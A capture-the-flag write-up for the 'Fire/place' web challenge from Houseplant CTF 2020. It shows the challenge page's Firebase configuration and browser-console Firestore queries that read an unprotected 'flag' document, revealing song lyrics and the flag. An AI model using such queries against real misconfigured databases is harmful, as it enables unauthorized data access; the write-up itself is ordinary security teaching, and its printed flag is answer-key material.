Houseplant CTF 2020 – Fire/place

Category: web
Points: 1783

Challenge

You see, I built a nice fire/place for us to all huddle around. It's completely decentralized, and we can all share stuff in it for fun!!
Dev: Jess
Hint! I wonder... what's inside the HTML page?
fire-place[0].html e4a4c2321d18246d027184605ca52866

Solution
The challenge gives you an HTML file which connects to a Firestore environment.
```html






Welcome to fire/place!




        X:

        Y:

        X offset:  
Y offset:  




<script>
var firebaseConfig = {
    apiKey: "AIzaSyABDa1gqWZhFy-3OQ664XplH65TNVXfm6E",
    authDomain: "jade-adventure-274923.firebaseapp.com",
    projectId: "jade-adventure-274923",
    storageBucket: "jade-adventure-274923.appspot.com",
    messagingSenderId: "891770626123",
    appId: "1:891770626123:web:70414772b58fceaa88edce",
    measurementId: "G-GZPE7S1WJ0"
};
firebase.initializeApp(firebaseConfig);
firebase.analytics();
const db = firebase.firestore()
</script>




```
The application allows you to color pixels on a canvas shared with other users, storing data into Firestore repository.
To interact with Firebase installation you can use the browser console.
Analyzing the client source code and reading the official documentation, you can discover that data of a document can be retrieved with the following snippet.
javascript
db.collection("board").doc("data").get().then(function(doc) {
    if (doc.exists) {
        console.log("Document data:", doc.data());
    } else {
        console.log("No such document!");
    }
}).catch(function(error) {
    console.log("Error getting document:", error);
});

The retrieved data will be a structure with all the RGB values for pixels.
javascript
Document data: Object { dat: (3929) […] }

You can try a document called flag.
javascript
db.collection("board").doc("flag").get().then(function(doc) {
    if (doc.exists) {
        console.log("Document data:", doc.data());
    } else {
        console.log("No such document!");
    }
}).catch(function(error) {
    console.log("Error getting document:", error);
});

And you will get the lyrics of a famous song and the flag.
javascript
Document data: 
Object { "Never gonna give you up": "We're no strangers to love You know the rules and so do I A full commitment's what I'm thinking of You wouldn't get this from any other guy  I just wanna tell you how I'm feeling Gotta make you understand  Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you  We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it  And if you ask me how I'm feeling Don't tell me you're too blind to see  Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you ​ (Ooh give you up) (Ooh give you up) (Ooh) Never gonna give, never gonna give (give you up) (Ooh) Never gonna give, never gonna give (give you up)  We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it  I just wanna tell you how I'm feeling Gotta make you understand  Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you", "flag!!!!!!!!!!!!!": "rtcp{d0n't_g1ve_us3rs_db_a((3ss}" }

So the flag is the following.

rtcp{d0n't_g1ve_us3rs_db_a((3ss}

